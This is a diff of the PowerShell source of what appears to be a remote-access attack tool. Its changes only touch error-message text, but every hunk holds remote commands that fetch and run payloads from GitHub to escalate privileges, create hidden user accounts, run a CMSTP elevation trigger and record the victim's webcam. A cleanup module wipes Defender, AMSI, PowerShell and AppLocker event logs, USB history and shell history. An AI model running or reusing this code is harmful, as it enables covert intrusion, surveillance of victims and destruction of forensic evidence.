+           $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/EnableAllParentPrivileges.exe`" -OutFile `"`$Env:TMP\EnableAllParentPrivileges.exe`"|Unblock-File;cd `$Env:TMP;.\EnableAllParentPrivileges.exe;$CmdlineToExecute;Remove-Item -Path `"`$Env:TMP\EnableAllParentPrivileges.exe`" -Force;Get-Content myprivileges.log;Remove-Item myprivileges.log -Force}Else{echo `"   `> Error: administrator privileges required on remote`" `> `$Env:TMP\fddds.log;Get-Content -Path `"`$Env:TMP\fddds.log`";Remove-Item -Path `"`$Env:TMP\fddds.log`" -Force}"
         }
         If($all_choise -ieq "cmdline")
         {
@@ -2661,7 +2645,7 @@ While($Client.Connected)
 
            #Execute command remote
            write-host " * Elevating all process privileges." -ForegroundColor Green
-           $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/EnableAllParentPrivileges.exe`" -OutFile `"`$Env:TMP\EnableAllParentPrivileges.exe`"|Unblock-File;cd `$Env:TMP;.\EnableAllParentPrivileges.exe;$CmdlineToExecute;Remove-Item -Path `"`$Env:TMP\EnableAllParentPrivileges.exe`" -Force}Else{echo `"   Error: administrator privileges required on remote`" `> `$Env:TMP\fddds.log;Get-Content -Path `"`$Env:TMP\fddds.log`";Remove-Item -Path `"`$Env:TMP\fddds.log`" -Force}"
+           $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/EnableAllParentPrivileges.exe`" -OutFile `"`$Env:TMP\EnableAllParentPrivileges.exe`"|Unblock-File;cd `$Env:TMP;.\EnableAllParentPrivileges.exe;$CmdlineToExecute;Remove-Item -Path `"`$Env:TMP\EnableAllParentPrivileges.exe`" -Force}Else{echo `"   `> Error: administrator privileges required on remote`" `> `$Env:TMP\fddds.log;Get-Content -Path `"`$Env:TMP\fddds.log`";Remove-Item -Path `"`$Env:TMP\fddds.log`" -Force}"
         }
         If($all_choise -ieq "Return" -or $all_choise -ieq "cls" -or $all_choise -ieq "Modules" -or $all_choise -ieq "clear")
         {
@@ -2797,7 +2781,7 @@ While($Client.Connected)
         If($my_choise -ieq "RottenP" -or $my_choise -ieq "rotten")
         {
           write-host " * Searching rotten potato vuln settings.`n" -ForegroundColor Green
-          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){echo `"   Error: this module cant not run with admin Privileges`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{cmd /R whoami /priv|findstr /i /C:`"SeImpersonatePrivilege`" /C:`"SeAssignPrimaryPrivilege`" /C:`"SeTcbPrivilege`" /C:`"SeBackupPrivilege`" /C:`"SeRestorePrivilege`" /C:`"SeCreateTokenPrivilege`" /C:`"SeLoadDriverPrivilege`" /C:`"SeTakeOwnershipPrivilege`" /C:`"SeDebugPrivileges`" `> dellog.txt;`$check_ACL = get-content dellog.txt|findstr /i /C:`"Enabled`";If(`$check_ACL){echo `"   Rotten Potato Vulnerable Settings Found [Enabled] ..`" `> test.txt;Get-Content test.txt;Remove-Item test.txt -Force;Get-Content dellog.txt;remove-item dellog.txt -Force}else{echo `"   Error: none weak permissions found [ Rotten Potato ] ..`" `> test.txt;Get-Content test.txt;Remove-Item test.txt -Force;Remove-Item dellog.txt -Force}}";
+          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){echo `"   `> Error: this module cant not run with admin Privileges`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{cmd /R whoami /priv|findstr /i /C:`"SeImpersonatePrivilege`" /C:`"SeAssignPrimaryPrivilege`" /C:`"SeTcbPrivilege`" /C:`"SeBackupPrivilege`" /C:`"SeRestorePrivilege`" /C:`"SeCreateTokenPrivilege`" /C:`"SeLoadDriverPrivilege`" /C:`"SeTakeOwnershipPrivilege`" /C:`"SeDebugPrivileges`" `> dellog.txt;`$check_ACL = get-content dellog.txt|findstr /i /C:`"Enabled`";If(`$check_ACL){echo `"   Rotten Potato Vulnerable Settings Found [Enabled] ..`" `> test.txt;Get-Content test.txt;Remove-Item test.txt -Force;Get-Content dellog.txt;remove-item dellog.txt -Force}else{echo `"   `> Error: none weak permissions found [ Rotten Potato ] ..`" `> test.txt;Get-Content test.txt;Remove-Item test.txt -Force;Remove-Item dellog.txt -Force}}";
        }
         If($my_choise -ieq "Return" -or $my_choise -ieq "return" -or $my_choise -ieq "cls" -or $my_choise -ieq "Modules" -or $my_choise -ieq "modules" -or $my_choise -ieq "clear")
         {
@@ -2840,13 +2824,13 @@ While($Client.Connected)
             $AccountState = Read-Host
             Write-Host " * Create new user account" -ForegroundColor Green
             If(-not($AccountState) -or $AccountState -ieq $null){$AccountState = "hidden"}Else{$AccountState = "visible"}
-            $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/HiddenUser.ps1`" -OutFile `"`$Env:TMP\HiddenUser.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\HiddenUser.ps1 -Action Create -UserName $AccountName -Password $password -State $AccountState;Remove-Item -Path `$Env:TMP\HiddenUser.ps1 -Force}Else{echo `"`";echo `"    => error: Administrator privileges required!`"|Out-File `$Env:TMP\hidenUser.meterpeter;Get-Content -Path `$Env:TMP\hidenUser.meterpeter;Remove-Item -Path `$Env:TMP\hidenUser.meterpeter -Force}"
+            $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/HiddenUser.ps1`" -OutFile `"`$Env:TMP\HiddenUser.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\HiddenUser.ps1 -Action Create -UserName $AccountName -Password $password -State $AccountState;Remove-Item -Path `$Env:TMP\HiddenUser.ps1 -Force}Else{echo `"`";echo `"    `> Error: Administrator privileges required!`"|Out-File `$Env:TMP\hidenUser.meterpeter;Get-Content -Path `$Env:TMP\hidenUser.meterpeter;Remove-Item -Path `$Env:TMP\hidenUser.meterpeter -Force}"
          }
          If($AccManager_choise -ieq "Delete")
          {
             Write-Host " - Input account name: " -NoNewline -ForegroundColor Red;
             $AccountName = Read-Host;Write-Host " * Delete '$AccountName' user account" -ForegroundColor Green
-            $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/HiddenUser.ps1`" -OutFile `"`$Env:TMP\HiddenUser.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\HiddenUser.ps1 -Action Delete -UserName $AccountName;Remove-Item -Path `$Env:TMP\HiddenUser.ps1 -Force}Else{echo `"    => error: Administrator privileges required!`"|Out-File `$Env:TMP\hidenUser.meterpeter;Get-Content -Path `$Env:TMP\hidenUser.meterpeter;Remove-Item -Path `$Env:TMP\hidenUser.meterpeter -Force}"
+            $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/HiddenUser.ps1`" -OutFile `"`$Env:TMP\HiddenUser.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\HiddenUser.ps1 -Action Delete -UserName $AccountName;Remove-Item -Path `$Env:TMP\HiddenUser.ps1 -Force}Else{echo `"    `> Error: Administrator privileges required!`"|Out-File `$Env:TMP\hidenUser.meterpeter;Get-Content -Path `$Env:TMP\hidenUser.meterpeter;Remove-Item -Path `$Env:TMP\hidenUser.meterpeter -Force}"
          }
          If($AccManager_choise -ieq "Return" -or $AccManager_choise -ieq "cls" -or $AccManager_choise -ieq "modules" -or $AccManager_choise -ieq "clear")
          {
@@ -2928,7 +2912,7 @@ While($Client.Connected)
          {
             Write-Host " * Cleanning remote system tracks ..`n" -ForegroundColor Green;
             $MeterClient = "$payload_name" + ".ps1" -Join ''
-            $Command = "echo `"[*] Cleaning Temporary folder artifacts ..`" `> `$Env:TMP\clean.meterpeter;Remove-Item -Path `"`$Env:TMP\*`" -Include *.exe,*.bat,*.vbs,*.tmp,*.log,*.ps1,*.dll,*.lnk,*.inf,*.png,*.zip -Exclude *$MeterClient* -EA SilentlyContinue -Force -Recurse;echo `"[*] Cleaning Recent directory artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;Remove-Item -Path `"`$Env:APPDATA\Microsoft\Windows\Recent\*`" -Include *.exe,*.bat,*.vbs,*.log,*.ps1,*.dll,*.inf,*.lnk,*.png,*.txt,*.zip -Exclude desktop.ini -EA SilentlyContinue -Force -Recurse;echo `"[*] Cleaning Recent documents artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;cmd /R REG DELETE `"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs`" /f|Out-Null;cmd /R REG ADD `"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs`" /ve /t REG_SZ /f|Out-Null;echo `"[*] Cleaning DNS Resolver cache artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;cmd /R ipconfig /flushdns|Out-Null;If(Get-Command `"Clear-RecycleBin`" -EA SilentlyContinue){echo `"[*] Cleaning recycle bin folder artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;Start-Process -WindowStyle Hidden powershell -ArgumentList `"Clear-RecycleBin -Force`" -Wait}Else{echo `"[x] Cleaning recycle bin folder artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;echo `"    => Error: 'Clear-RecycleBin' not found ..`" `>`> `$Env:TMP\clean.meterpeter};echo `"[*] Cleaning ConsoleHost_history artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;`$CleanPSLogging = (Get-PSReadlineOption -EA SilentlyContinue).HistorySavePath;echo `"MeterPeterNullArtifacts`" `> `$CleanPSLogging;`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){echo `"[*] Cleaning Cache of plugged USB devices ..`" `>`> `$Env:TMP\clean.meterpeter;cmd /R REG DELETE `"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`" /f|Out-Null;cmd /R REG ADD `"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`" /ve /t REG_SZ /f|Out-Null;echo `"[-] Cleaning Eventvwr logfiles from snapin ..`" `>`> `$Env:TMP\clean.meterpeter;`$PSlist = wevtutil el | Where-Object {`$_ -iMatch '(AMSI/Debug|UAC|Powershell|BITS|Windows Defender|WMI-Activity/Operational|AppLocker/Exe and DLL|AppLocker/MSI and Script|TCPIP/Operational)' -and `$_ -iNotMatch '(/Admin)`$'};ForEach(`$PSCategorie in `$PSlist){wevtutil cl `"`$PSCategorie`"|Out-Null;echo `"    deleted: `$PSCategorie`" `>`> `$Env:TMP\clean.meterpeter}}Else{echo `"[X] Cleaning Eventvwr logfiles from snapin ..`" `>`> `$Env:TMP\clean.meterpeter;echo `"    => error: Administrator privileges required!`" `>`> `$Env:TMP\clean.meterpeter};Get-Content -Path `$Env:TMP\clean.meterpeter;Remove-Item -Path `$Env:TMP\clean.meterpeter -Force"
+            $Command = "echo `"[*] Cleaning Temporary folder artifacts ..`" `> `$Env:TMP\clean.meterpeter;Remove-Item -Path `"`$Env:TMP\*`" -Include *.exe,*.bat,*.vbs,*.tmp,*.log,*.ps1,*.dll,*.lnk,*.inf,*.png,*.zip -Exclude *$MeterClient* -EA SilentlyContinue -Force -Recurse;echo `"[*] Cleaning Recent directory artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;Remove-Item -Path `"`$Env:APPDATA\Microsoft\Windows\Recent\*`" -Include *.exe,*.bat,*.vbs,*.log,*.ps1,*.dll,*.inf,*.lnk,*.png,*.txt,*.zip -Exclude desktop.ini -EA SilentlyContinue -Force -Recurse;echo `"[*] Cleaning Recent documents artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;cmd /R REG DELETE `"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs`" /f|Out-Null;cmd /R REG ADD `"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs`" /ve /t REG_SZ /f|Out-Null;echo `"[*] Cleaning DNS Resolver cache artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;cmd /R ipconfig /flushdns|Out-Null;If(Get-Command `"Clear-RecycleBin`" -EA SilentlyContinue){echo `"[*] Cleaning recycle bin folder artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;Start-Process -WindowStyle Hidden powershell -ArgumentList `"Clear-RecycleBin -Force`" -Wait}Else{echo `"[*] Cleaning recycle bin folder artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;echo `"   `> Error: 'Clear-RecycleBin' not found ..`" `>`> `$Env:TMP\clean.meterpeter};echo `"[*] Cleaning ConsoleHost_history artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;`$CleanPSLogging = (Get-PSReadlineOption -EA SilentlyContinue).HistorySavePath;echo `"MeterPeterNullArtifacts`" `> `$CleanPSLogging;`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){echo `"[*] Cleaning Cache of plugged USB devices ..`" `>`> `$Env:TMP\clean.meterpeter;cmd /R REG DELETE `"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`" /f|Out-Null;cmd /R REG ADD `"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`" /ve /t REG_SZ /f|Out-Null;echo `"[-] Cleaning Eventvwr logfiles from snapin ..`" `>`> `$Env:TMP\clean.meterpeter;`$PSlist = wevtutil el | Where-Object {`$_ -iMatch '(AMSI/Debug|UAC|Powershell|BITS|Windows Defender|WMI-Activity/Operational|AppLocker/Exe and DLL|AppLocker/MSI and Script|TCPIP/Operational)' -and `$_ -iNotMatch '(/Admin)`$'};ForEach(`$PSCategorie in `$PSlist){wevtutil cl `"`$PSCategorie`"|Out-Null;echo `"    deleted: `$PSCategorie`" `>`> `$Env:TMP\clean.meterpeter}}Else{echo `"[X] Cleaning Eventvwr logfiles from snapin ..`" `>`> `$Env:TMP\clean.meterpeter;echo `"   `> Error: Administrator privileges required!`" `>`> `$Env:TMP\clean.meterpeter};Get-Content -Path `$Env:TMP\clean.meterpeter;Remove-Item -Path `$Env:TMP\clean.meterpeter -Force"
          }
          If($track_choise -ieq "Paranoid") 
          {
@@ -3138,7 +3122,7 @@ While($Client.Connected)
 
           #Execute Command Remote
           Start-Sleep -Seconds 1;$TriggerSettings = "$Local_Host"+":"+"$Local_Port" -join ''
-          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){echo `"`n[x] Error: Abort, session allready running under Administrator token ..`" `> `$Env:TMP\EOPsettings.log;Get-Content `$Env:TMP\EOPsettings.log;Remove-Item -Path `$Env:TMP\EOPsettings.log -Force;}Else{echo `"$TriggerSettings`" `> `$Env:TMP\EOPsettings.log;iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/CMSTPTrigger.ps1 -OutFile `$Env:TMP\CMSTPTrigger.ps1|Out-Null;Start-Process -WindowStyle hidden powershell.exe -ArgumentList `"-File `$Env:TMP\CMSTPTrigger.ps1 -DelayTime $DelayTime -LoopFor $ExecRatLoop -RatLocation $RatLocation`"}"
+          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){echo `"`n`> Error: Abort, session allready running under Administrator token ..`" `> `$Env:TMP\EOPsettings.log;Get-Content `$Env:TMP\EOPsettings.log;Remove-Item -Path `$Env:TMP\EOPsettings.log -Force;}Else{echo `"$TriggerSettings`" `> `$Env:TMP\EOPsettings.log;iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/CMSTPTrigger.ps1 -OutFile `$Env:TMP\CMSTPTrigger.ps1|Out-Null;Start-Process -WindowStyle hidden powershell.exe -ArgumentList `"-File `$Env:TMP\CMSTPTrigger.ps1 -DelayTime $DelayTime -LoopFor $ExecRatLoop -RatLocation $RatLocation`"}"
         }
         If($Escal_choise -ieq "Delete" -or $Escal_choise -ieq "del")
         {
@@ -3469,7 +3453,7 @@ While($Client.Connected)
            If(-not($DependOff) -or $DependOff -iMatch '^(n|no)$')
            {
               #Execute command remote
-              $Command = "`$CheckInstall = [bool](python -V);If(`$CheckInstall -Match 'True'){iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WebCam-Capture/Invoke-webcamAvi.ps1`" -OutFile `"`$Env:TMP\Invoke-webcamAvi.ps1`";Start-Process -WindowStyle hidden powershell -argumentList `"-file `$Env:TMP\Invoke-webcamAvi.ps1 -rectime $RecTime -starttime $StartTime -autodel`";echo `"`n  State   : recording webcam live in avi format.`";echo `"  Remark  : module takes a few seconds before start capture.`";echo `"  Storage : `$Env:TMP\meterpeter.avi`"}Else{echo `"`n  Error: module requires 'Python3' installed on target system.`"}"
+              $Command = "`$CheckInstall = [bool](python -V);If(`$CheckInstall -Match 'True'){iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WebCam-Capture/Invoke-webcamAvi.ps1`" -OutFile `"`$Env:TMP\Invoke-webcamAvi.ps1`";Start-Process -WindowStyle hidden powershell -argumentList `"-file `$Env:TMP\Invoke-webcamAvi.ps1 -rectime $RecTime -starttime $StartTime -autodel`";echo `"`n  State   : recording webcam live in avi format.`";echo `"  Remark  : module takes a few seconds before start capture.`";echo `"  Storage : `$Env:TMP\meterpeter.avi`"}Else{echo `"`n  `> Error: module requires 'Python3' installed on target system.`"}"
            }
            Else
            {
